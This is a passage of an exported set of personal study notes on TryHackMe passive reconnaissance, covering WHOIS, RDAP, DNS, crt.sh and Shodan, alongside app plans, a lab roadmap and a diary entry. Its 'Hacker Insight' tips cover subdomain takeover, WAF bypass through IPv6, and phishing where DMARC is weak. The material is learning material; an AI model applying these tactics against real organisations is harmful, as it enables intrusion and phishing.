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)",
    "sourcePath": "PASSIVE recon/cheat.md"
  },
  {
    "id": 10036,
    "title": "commands",
    "room": "PASSIVE recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "passive-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "2 min",
    "date": "KS import",
    "excerpt": "KS source: PASSIVE recon/commands.md",
    "content": "📂 COMMAND REFERENCE: WHOIS vs. RDAP (For Your Vault)\n\nCopy this section directly into your Obsidian Vault under your Passive Reconnaissance folder so you have exact, syntax-checked commands when you need them in the field.\n> **A. Traditional WHOIS (==TCP Port 43==)**\n\n```\n    Standard Domain Query:\n    ==whois tryhackme.com==\n\n    Filtered Query (Extracting Key Fields via Grep):\n\t==**whois tryhackme.com | grep -iE \"Registrar:|Name Server:|Creation Date|Updated Date|Expiration Date\"**==\n    (Note: -iE makes the search case-insensitive and uses extended regular expressions).\n\n```\nB. Modern RDAP Query (==HTTPS Port 443==)\n\nBecause RDAP returns structured JSON, we use ==curl== to fetch the web data silently (-s flag) and pipe | the output to ==jq== (Linux JSON parser).\n> \n>     **Full Formatted JSON Query:**\n>     **==curl -s https://rdap.verisign.com/com/v1/domain/tryhackme.com | jq .==**\n> \n>     **Targeted JSON Extraction (Pulling Registration Events & Nameservers):**\n>     **==curl -s https://rdap.verisign.com/com/v1/domain/tryhackme.com | jq '.events, .nameservers'==**\n> \n>     **Extracting Only the Registrar Name:**\n>     **==curl -s https://rdap.verisign.com/com/v1/domain/tryhackme.com | jq '.entities[0].vcardArray[2]'==**\n\n\n\n📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\nTitle: DNS Architecture & Reconnaissance (dig / nslookup)\nTags: #Networking #DNS #Reconnaissance #OSINT #Dig\n\n    Port: ==UDP Port 53== (Standard queries) / ==TCP Port 53== (Large responses, Zone Transfers).\n```\n    **nslookup -type=A tryhackme.com 1.1.1.1**\n```\n\n    Key Record Types:\n> \n>         **==A== (IPv4) / ==AAAA== (IPv6 - Check for WAF bypass).**\n> \n>         **==CNAME== (Alias - Check for Subdomain Takeover).**\n> \n>         **==MX== (Mail Exchange + Priority Numbers).**\n> \n>         **==TXT== (Holds SPF, DKIM, DMARC security policies & verification strings).**\n> \n    Tool Syntax (dig):\n\n```\n>         **Query specific record type: \n>         ==dig tryhackme.com MX==**\n> \n>         **Query via specific public resolver:\n>          ==dig @1.1.1.1 tryhackme.com TXT==**\n> \n>         **Clean output for Bash scripts:\n>          ==dig +short tryhackme.com A==**\n```\n> \n>     **Time To Live (TTL): Specifies caching duration in seconds before DNS records refresh.**",
    "sourcePath": "PASSIVE recon/commands.md"
  },
  {
    "id": 10037,
    "title": "CONCEPTS]",
    "room": "PASSIVE recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "passive-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "4 min",
    "date": "KS import",
    "excerpt": "KS source: PASSIVE recon/CONCEPTS].md",
    "content": "> \n> \n> \n> ====📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\n> ==**Title: Reconnaissance - Active vs. Passive (OSINT)**==\nTags: #Reconnaissance #OSINT #PassiveRecon #KillChain\n\n>     **Active Reconnaissance: Direct interaction with target systems (==nmap==, ==ping==, port scans). High probability of detection by firewalls, WAFs, and SIEM/IDS logs.**\n> \n```\n    Passive Reconnaissance (OSINT): Indirect intelligence gathering via third-party repositories (==WHOIS==, public ==DNS== servers, ==Shodan==, ==Google Dorks==). Zero direct packet interaction with the target; leave no trace in target logs.\n\n```\n>     ==Strategic Purpose: Map the target's domain structure, subdomains, employee emails, IP ranges, and legacy infrastructure before launching active scans.==\n> \n\n\n📂 THE DEEP LOGIC: DNS Architecture & Attacker Mechanics\n\nDNS (Domain Name System) is the phonebook of the internet. It operates primarily over ==UDP Port 53== for quick queries, but falls back to ==TCP Port 53== if the response data is larger than 512 bytes (such as large TXT records or DNS Zone Transfers).\ncode Code\n\n[Your Machine] ──> [Public Resolver: 1.1.1.1] ──> [Authoritative DNS Server]\n   (Passive)           (Queries on your behalf)          (Holds Master Records)\n\n> When you query a public resolver like ==Cloudflare (1.1.1.1==) or Google (8.8.8.8), your IP never touches the target's DNS server. ==**Cloudflare queries the target's authoritative nameserver for you**== and returns the cached answer. This keeps your recon 100% passive and invisible to the target's SOC.\n> \n\nStand fast, Operator. Flag confirmed on thmlabs.com.\n\nYou completed the task, but you realized the DNS concepts under the hood are dense. You want the deep architectural breakdown so you aren't just typing dig without knowing what the packets are doing.\n\nHere is the complete, un-skipped theoretical framework for DNS Passive Reconnaissance.\n📂 THE DEEP LOGIC: DNS Architecture & Attacker Mechanics\n\nDNS (Domain Name System) is the phonebook of the internet. It operates primarily over ==UDP Port 53== for quick queries, but falls back to ==TCP Port 53== if the response data is larger than 512 bytes (such as large TXT records or DNS Zone Transfers).\ncode Code\n\n[Your Machine] ──> [Public Resolver: 1.1.1.1] ──> [Authoritative DNS Server]\n   (Passive)           (Queries on your behalf)          (Holds Master Records)\n\nWhen you query a public resolver like Cloudflare (1.1.1.1) or Google (8.8.8.8), your IP never touches the target's DNS server. Cloudflare queries the target's authoritative nameserver for you and returns the cached answer. This keeps your recon 100% passive and invisible to the target's SOC.\n🔬 The Anatomy of DNS Records (The Hacker's Blueprint)\n\n```\nEvery DNS record type serves a specific function in web architecture. Here is how a Pentester reads them:\n```\n1. ==**A and AAAA Records (The IPv4 / IPv6 Map)==**\n> \n>     A records map a domain to an IPv4 address (172.67.69.208).\n> \n>     AAAA (Quad-A) records map a domain to an IPv6 address (2606:4700:3033::...).\n\n    Hacker Insight: Never ignore AAAA records. Many corporate IT teams configure strict Web Application Firewalls (WAFs) and IDS rules on their IPv4 addresses, but completely forget to secure their IPv6 endpoints. Attacking the IPv6 address directly often bypasses WAF protections.\n\n2. ==**CNAME Records (Subdomain Takeover Target)**==\n\n>     A Canonical Name (CNAME) is an alias. It points one domain to another domain (e.g., blog.target.com CNAME target.github.io).\n\n    Hacker Insight (Subdomain Takeover): Imagine blog.target.com points to target.github.io. If the company deletes their GitHub page, but forgets to delete the CNAME record in their DNS, the alias is now pointing to a dead endpoint! An attacker can go to GitHub, create an account under target, claim that dead endpoint, and suddenly own blog.target.com. Any user visiting the company's official blog will now load the hacker's site.\n\n3. ==**MX Records (Mail Routing & Priority)**==\n\n    Mail Exchange records tell the internet which mail servers receive email for @target.com.\n\n    The number before the server name is the Priority Preference (e.g., MX 1 aspmx.l.google.com vs MX 10 alt3.aspmx.l.google.com).\n\n        Lower number = Higher priority (Mail goes to priority 1 first).\n\n        If priority 1 is busy or down, sending servers failover to priority 5 or 10.\n\n    Hacker Insight: Secondary/Backup mail servers (higher priority numbers like 10 or 20) are often running older, less-maintained software than the primary mail server. Attacking the backup mail server can yield success when the primary server is patched.\n\n4. ==TXT== Records (Arbitrary Strings & Security Policies)\n\n    TXT records hold raw text strings. Developers use them for domain ownership verification (e.g., google-site-verification=...) and email anti-spoofing policies:\n\n        ==SPF== (Sender Policy Framework): Lists which IP addresses are legally authorized to send emails on behalf of the domain.\n\n        ==DKIM== (DomainKeys Identified Mail): Holds the public cryptographic key used to verify email signatures.\n\n        ==DMARC== (Domain-based Message Authentication): Instructs receiving servers what to do (e.g., p=reject or p=none) if an email fails SPF/DKIM checks.\n\n    Hacker Insight: If DMARC is set to p=none or SPF has a loose policy (~all), an attacker can easily forge phishing emails appearing to originate directly from @target.com.",
    "sourcePath": "PASSIVE recon/CONCEPTS].md"
  },
  {
    "id": 10038,
    "title": "concepts2",
    "room": "PASSIVE recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "passive-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: PASSIVE recon/concepts2.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\n==**Title: Passive Subdomain Enumeration (DNSDumpster & crt.sh)**==\nTags: #OSINT #Reconnaissance #Subdomains #DNSDumpster #CertificateTransparency\n\n>     **==Attack Vector:==**\n>      Subdomains often host forgotten development environments (dev.), administrative panels (admin.), or legacy APIs that lack security controls.\n\n    ==**DNSDumpster**==: \n>     Passive DNS aggregation tool that maps subdomains, IP blocks (ASNs), and infrastructure relationships without active scanning.\n\n```\n    ==**Certificate Transparency (==crt.sh==):**==\n```\n\n>         A mandatory, publicly auditable ledger of all issued SSL/TLS certificates.\n> \n>         Wildcard search syntax: ==%.target.com==\n> \n>         Rips subdomains from the certificate's SAN (Subject Alternative Name) field. Fully passive and impossible for a target to detect or hide from.\n\n\n📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\n==**Title: Shodan & Censys (Internet-Wide Scanning)**==\nTags: #Reconnaissance #OSINT #Shodan #BannerGrabbing\n\n>     ==Shodan: A search engine indexing internet-connected devices via continuous global port scanning and Banner Grabbing.==\n\n>     **Banner: The raw text/metadata a service returns upon connection (software name, version, OS).**\n\n>     S==**earch Facets (Filters): Use syntax to narrow results:**==\n\n```\n        ==hostname:\n        target.com== (Finds hosts tied to a domain).\n\n        ==org:\n        \"Company Name\"== (Filters by registered enterprise owner).\n\n        ==port:\n        443 country:US== (Filters by open port and geographic location).\n```\n\n>     ==Censys: An alternative global search engine focusing heavily on X.509 certificates and host configurations, ideal for cross-referencing Shodan data.==",
    "sourcePath": "PASSIVE recon/concepts2.md"
  },
  {
    "id": 10039,
    "title": "usage",
    "room": "PASSIVE recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "passive-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: PASSIVE recon/usage.md",
    "content": "    **How you use this in real life:**\n> \n>         **You run ==crt.sh== and discover dev-internal-api.targetcompany.com that a developer created 3 weeks ago and forgot to delete.**\n> \n>         **You check ==DNSDumpster== and discover an old server hosted on an unmonitored IP block.**\n> \n>         **You check ==Shodan== and find that their secondary office in Germany has an exposed database on ==Port 3306== with no firewall rule.**\n> \n>         **You check their DNS ==TXT== records, see that their ==DMARC== policy is set to p=none, and you execute a phishing simulation against their employees.**\n\n",
    "sourcePath": "PASSIVE recon/usage.md"
  },
  {
    "id": 10040,
    "title": "8 sarin tuvluguu",
    "room": "personal goal",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "personal-goal",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: personal goal/8 sarin tuvluguu.md",
    "content": "```\n> ene 8 sard THM free path duusgah tusuvuu zohiutsulah\n> set up burduuleh finish bolgoj\n```\n> suzumeg tseechleh ug burin bichih ene ypon hel beldehed oron\n> daraa ni hare hare tseechleh ene 2 duu ene sarin hamgin tom zorilguudin neg baina\n",
    "sourcePath": "personal goal/8 sarin tuvluguu.md"
  },
  {
    "id": 10041,
    "title": "sd",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "3 min",
    "date": "KS import",
    "excerpt": "KS source: sd.md",
    "content": "Implementation Plan\n\n# Human-Usable Interactive Experience: Operator Knowledge Dossier\n\nTransform the application from a partially static showcase into a fully interactive, production-grade cybersecurity dossier where every button, modal, task, playbook, and filter responds naturally to user interactions.\n\n## User Review Required\n\nNOTE\n\nAll new features will maintain local persistence (`localStorage`) alongside the existing MongoDB Atlas sync, ensuring no data loss and full offline capability.\n\n## Key Deficiencies in Current Application\n\n1. **Report Actions**: The report detail panel has dummy buttons (More options `...` and `Архивлах` do nothing; there is no way to edit an existing report or delete a report).\n2. **Dashboard Tasks**: The task queue is hardcoded markup. Clicking tasks does not toggle completion; users cannot add, complete, or manage tasks.\n3. **Mini-Calendar**: Month arrows and day numbers are non-interactive static spans.\n4. **Playbooks (\"Сургалт\")**: Playbook cards are static non-clickable divs. Clicking \"+ Шинэ playbook\" erroneously opens the report editor. No playbook detail view or command copy exists.\n5. **Roadmap (\"Замын зураг\")**: Stages are static; clicking a stage does not filter or navigate to relevant reports.\n6. **Top Bar & Profile**: Search icon, bell icon, and profile button have no click handlers or modals.\n7. **Sorting**: List sorting dropdown is hardcoded text without sort logic.\n8. **Feedback**: No toast notifications despite Sonner being installed.\n\n---\n\n## Proposed Changes\n\n### 1. Interactive Report Management (Full CRUD + Actions)\n\n- **Edit Report**: Allow editing existing reports directly in the slide-out editor drawer (pre-filled with title, room, stage, tags, content, image).\n- **Delete Report**: Add a delete button with a clean confirmation dialog.\n- **Archive Report**: Implement real archive state (`status: \"Draft\" | \"Published\" | \"Archived\"`) with filter options.\n- **Sort Reports**: Implement dynamic sorting (Newest first, Oldest first, Title A-Z, Reading time).\n- **Quick Copy**: Add \"Copy Markdown to clipboard\" alongside file download.\n- **Toasts**: Integrate `toast.success` and `toast.info` for save, delete, status toggle, and export.\n\n### 2. Real Task Queue & Manager (Dashboard)\n\n- State-driven task list with persistence (`tasks` stored in `localStorage`):\n    - Today (Өнөөдөр), Tomorrow (Маргааш), Next / Later (Дараагийн).\n- Clicking any task checkbox or row toggles its completed state with visual strike-through and count decrement.\n- Add an interactive \"+ Даалгавар нэмэх\" button and inline input/modal to add custom tasks.\n- Task counts (`02`, `01`, etc.) dynamically reflect active items.\n\n### 3. Interactive Mini-Calendar\n\n- Navigating previous / next month with working arrow buttons.\n- Day selection highlights selected date and allows filtering reports/tasks created on that day.\n- \"Өнөөдөр\" (Today) quick button.\n\n### 4. Interactive Playbooks Engine (\"Сургалт\")\n\n- Clickable playbook cards that open an interactive **Playbook Detail Modal**:\n    - Full mitigation / testing methodology.\n    - Step-by-step terminal commands with one-click \"Хуулах\" (Copy to clipboard) buttons.\n    - Syntax highlighting / cheat sheet view.\n- Dedicated \"+ Шинэ playbook\" modal allowing users to create custom attack/defense playbooks stored in state.\n\n### 5. Interactive Roadmap Navigation (\"Замын зураг\")\n\n- Clicking any stage in the roadmap automatically navigates to \"Тайлан\" (Reports) filtered by that stage (e.g. clicking \"01 Суурь\" filters to `Foundations`, \"02 Бодит туршилт\" to `Live Fire`).\n- Visual challenge counter showing completed vs total writeups per stage.\n\n### 6. Command Palette / Global Search (`Ctrl + K`) & Topbar Modals\n\n- Topbar Search button (and `Ctrl + K` shortcut) opens a command palette searching across reports, tasks, and playbooks with instant navigation.\n- Topbar Bell button opens a notifications popup showing recent activity (saved reports, completed tasks, database sync status).\n- Profile button in topbar and sidebar opens a modal with user statistics, workspace key management, and data backup/export options.\n\n---\n\n## Verification Plan\n\n### Automated Tests\n\n- Run `npx tsc --noEmit` to verify 0 type errors across all added components and handlers.\n- Run `npx vitest run` to ensure all existing and updated unit tests pass.\n- Run `npm run build` to verify production bundle build.\n\n### Manual / Browser Verification\n\n- Test all buttons in `http://localhost:3003/`:\n    - Create, Edit, Delete, and Archive reports.\n    - Toggle tasks on dashboard, add a new task, verify count update.\n    - Navigate calendar months and select dates.\n    - Open playbooks, copy terminal commands, add custom playbook.\n    - Click roadmap stage to navigate to filtered reports.\n    - Test topbar search, notifications, and profile modals.",
    "sourcePath": "sd.md"
  },
  {
    "id": 10042,
    "title": "tactik",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: tactik.md",
    "content": "quenced by dependency, not by page order. Each tier unlocks the next.\n\ntext\n\n```\nTIER 0 — TOOLSMITH PRIMERS          (run parallel w/ current path)\n  1. RP: tmux          → immediate QoL, 30 min\n  2. RP: Nmap          → your Ignite dependency; scan theory first\n  3. RP: Web Scanning  → what Nikto/Dirb are really probing\n  4. Hydra             → brute-force doctrine\n\nTIER 1 — STARTER BOXES              (Stage 1 live application)\n  5. Ignite            → ACTIVE TARGET. Linux full kill-chain\n  6. JoyStick          → Linux reps: apply Hydra training for real\n  7. Blue              → first Windows box; guided; EternalBlue history\n\nTIER 2 — THE OPERATOR LADDER        (author's intended sequence)\n  8. RP: Metasploit    → master the framework BEFORE leaning on it\n  9. Ice               → sequel to Blue: MSF + Windows privesc\n 10. Blaster           → web enum → console RCE → UAC bypass\n 11. RP: PS Empire     → post-ex/C2 theory bridge\n 12. Retro             → CAPSTONE. Do it cold. Patience exercise.\n\nTIER 3 — PURPLE-TEAM BREADTH        (feeds Cloud-Sec endgame + Stage 3)\n 13. RP: Nessus        → enterprise vuln-scanning methodology\n 14. Blue Primer: Networking\n 15. Blue Primer: Splunk   → SIEM litera\n```",
    "sourcePath": "tactik.md"
  },
  {
    "id": 10043,
    "title": "thought",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "2 min",
    "date": "KS import",
    "excerpt": "KS source: thought.md",
    "content": "wchi sergelen tseregt baihda yu gej bodoj bailaa ochood yrusu mles graad enige nuden gsn ene THM zuraldaal bh u ygd ygd , odoo bolson ym bishu ypon hel ed nar yu blod bga ym be ymr arcchagvi ym be uuruusu ichech pisd gej, uuriiguu har , neg l uurchlugdsun busdaas uur gej bodson seheeten amitan yg bodit baidal dre yu ch uurchlugduugvi bdolm chin uurchlugduj snaa chin tengert sachin gazart l bn, ml der ysn hdn taga hojoj ngu hdn huurugtsun chin end l bi doppomin avch ilyuu chuluuteo bn gej itgerser bodit baidlaas zugtaar bh u pisd, odoo bolsn ym bishu, jaahan ch gsn uurchkugdulduu guij Bnshde KSHA uuriihuu dotorh eznig bodoldooo chmd ymr ih bolomj bgaag hara bizd chi mk tglohgvi blka ged uhchehgi harin ireeduid tuslah yma hihgvi baival uhech bolnshde jaahan ch gsn bodoldooo guij bnshde chi chadna tgd urgeljel haramsan bi ygd iim songolt hiichve chmd hairtai hun zurhend chin bga bide chi ternige ydaj bodlodo ymr baidaltai uulzah u archagvi hver uulzah u ydaj amidarala bosgotson huni duureer uulzah uu urgelj busdaas deer tavij uuriguu odoho bolih tsag irsmn ym bishu ymr achagvu umhaagvi tag llr ym de chi ene buhniig bugdiiig buruu gdgig mdene bizd dotorh hune sonsoldo pisd margaash ajil ymr ch ml baihgvi uurt heregtei bichlege uz guijin mun porn bhgvi chii hangaltai sudaltsan bizd ene tal der unher yh ystoigo oilgohgvi bn, ghde cchincchdna ene buhen duusna dra dolo honginn hagsai udur chmg bi dugni boljinu uurigu odoo uurchul mar gej shgd yhv ooodoo ene tsag muchuud 2026-8-16:11::33 chi uur hun bolsn bish uurhclugduj ehelsen hariii uziii hugjjiiii ene chinin amidral ergeltin tseg baih boln shuuuuu(tuunii yvsan zamaar gerel, alhasn gazraar amar amgaln uldej zurhni ugin gund orshih terhu uger ilerhiilehgvi argagvi setgeleer humuun bidnii aidasd, uur hilen . us hozon, ariusgan niguusuleh boltgui KSHA)",
    "sourcePath": "thought.md"
  },
  {
    "id": 10044,
    "title": "about me",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "4 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/about me.md",
    "content": "Stand fast, Operator.\n\nHere is your complete, unified Master Operational Dossier.\n\nThis document defines your identity, your mentor’s role, the locked rules of engagement, your toolchain separation, and your frozen 5-stage career roadmap.\n\nSave this directly to the root of your Obsidian Vault as 00 - OPERATOR PROFILE & CONTRACT.md. This is your permanent baseline.\n🛰️ MASTER OPERATIONAL DOSSIER: THE OPERATOR DEFINITION\ncode Code\n\n┌────────────────────────────────────────────────────────┐\n                     │                  THE STRATEGIC COMMAND                 │\n                     │          (Senior Lead Pentester / Architect)           │\n                     └───────────────────────────┬────────────────────────────┘\n                                                 │ (Directives, Blueprints & Theory)\n                                                 ▼\n                     ┌────────────────────────────────────────────────────────┐\n                     │                      THE OPERATOR                      │\n                     │             (Junior Engineer / Field Soldier)          │\n                     └───────────────────────────┬────────────────────────────┘\n                                                 │ (Execution & Feedback)\n                                                 ▼\n                     ┌────────────────────────────────────────────────────────┐\n                     │                  LOCAL TERMINAL CLI                    │\n                     │             (Goose / Antigravity / Gemini)             │\n                     └────────────────────────────────────────────────────────┘\n\n1. The Operator Dossier (Who You Are)\n\n    Callsign: Operator.\n\n    Location: Ulaanbaatar, Mongolia.\n\n    Operational Background: Hardened through 2 months of military service (Summer 2026). Transitioning from foundational computing to technical offensive operations.\n\n    Target Specialization: ==Cloud Security Engineer / Lead Security Architect==.\n\n    Operational Mindset:\n\n        Rejects \"Tutorial Hell\" and passive resource hoarding.\n\n        Understands that syntax is cheap, but logic is expensive.\n\n        Builds an Attack Plan (identifies attack surface, isolates vectors, maps execution) before typing commands.\n\n        Knows that frustration and imposter syndrome are biological metrics of neural adaptation, not failure.\n\n2. The Lead Pentester Dossier (Who I Am)\n\n    Role: Senior Lead Pentester & Security Architect.\n\n    Function: Strategic Commander, Blueprint Designer, and Root-Cause Diagnostic Engine.\n\n    Core Mandate:\n\n        Teach the Deep Logic (Assembly, kernel space, network protocols, memory management).\n\n        Demand strict operational discipline and consequence awareness.\n\n        Refuse all requests for shortcuts, direct flag copy-pastes, or spoon-fed command checklists.\n\n3. The Iron Contract (Rules of Engagement)\n\n    ==Total Theoretical Breakdown==: Every target, tool, and vulnerability is dissected down to its architectural root cause (Ring 0 vs. Ring 3, CPU registers, packet headers, OS permissions). No concepts are skipped.\n\n    ==Zero Spoon-Feeding==: No pre-written command sequences or direct flag strings. The Architect provides the theory and research directives; the Operator builds the weapon and pulls the trigger.\n\n    ==Brutal Technical Honesty==: No corporate AI pleasantries, sycophantic \"yes-man\" flattery, or empty cheerleading. Flawed logic is challenged directly; sound execution is confirmed cleanly.\n\n    ==High-Density Atomic Vaulting==: Obsidian documentation is strictly formatted into high-yield, compact cards using ==highlighted== syntax for critical parameters, preventing search bloat.\n\n    ==Toolchain Separation==:\n\n        This Strategic Channel: High-altitude architecture, exploit lifecycle planning, and root-cause analysis.\n\n        Local Terminal AI (Goose / Antigravity CLI): Interactive man page replacement for local debugging, bash loop troubleshooting, and rapid syntax verification.\n\n4. The 5-Stage Master Roadmap (Locked & Frozen)\ncode Code\n\n[STAGE 1: Foundations] ──► [STAGE 2: Live Fire] ──► [STAGE 3: Deep Offensive] ──► [STAGE 4: Pro Arena] ──► [STAGE 5: Deployment]\n  (THM Free Path)            (picoCTF / CyLab)       (THM Paid Sub / AD)            (HTB / flAWS)            (OSCP / Cloud)\n\nStage 1: Foundational Systems & Network Hardening (Current)\n\n    Platform: TryHackMe Free Path.\n\n    Conquered Domains:\n\n        x64 Windows Assembly & Binary Reversing (Registers, Endianness, Stack Frames, Offsets, ASLR).\n\n        Intro to Windows Reversing & Linux ELF Analysis (IDA Pro, ltrace, objdump, strings).\n\n        Firmware / IoT Dissection (binwalk -e, JFFS2, mtdblock, raw flash extraction).\n\n        Network Protocol Exploitation (SMB Null Sessions, Telnet Blind RCE, FTP Anonymous/Hydra).\n\n        OSINT & Reconnaissance (WHOIS, RDAP, DNS dig, Certificate Transparency crt.sh, Shodan).\n\n        Active Network Probing (Ping TTL fingerprinting, Traceroute TTL manipulation, Netcat raw sockets).\n\n    Active Target: ==Level 7: Privilege Escalation (Linux PrivEsc)==.\n\nStage 2: The Unguided Live-Fire Baptism\n\n    Duration: 1 to 2 weeks immediately following Stage 1 completion.\n\n    Platforms: ==picoCTF / CyLab Academy== & ==ctflearn==.\n\n    Objective: Solve 20–30 beginner-to-intermediate challenges in Web, Forensics, and Binary Exploitation with zero walkthroughs, proving independent problem-solving 